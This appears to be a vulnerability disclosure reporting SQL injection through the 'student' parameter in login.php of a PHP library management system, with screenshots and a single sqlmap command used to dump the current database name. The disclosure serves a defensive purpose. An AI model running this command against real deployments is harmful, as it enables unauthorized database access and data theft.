**Title:** Library Management System In PHP With Source Code (Ver.2.0) login.php sql Injection 

**Vendor:** Fabian Ros [Library Management System In PHP With Source Code (Ver.2.0) - Source Code & Projects](https://code-projects.org/library-management-system-in-php-with-source-code-ver-2-0/)

**Audit:**

The argument `student` concatenated to query without being sanitized, resulting in sql injection

![image-20250702134729823](./images/image-20250702134729823.png)

**Verify:**

*Environment*: The database is named "libsystem" as follows:

![image-20250702142632175](./images/image-20250702142632175.png)

- Step 1: Save the request to a.txt

![image-20250702142747304](./images/image-20250702142747304.png)

- Step2: exploit

```shell
sqlmap -r a.txt -p student  --batch --current-db --flush-session
```

![image-20250702143158256](./images/image-20250702143158256.png)



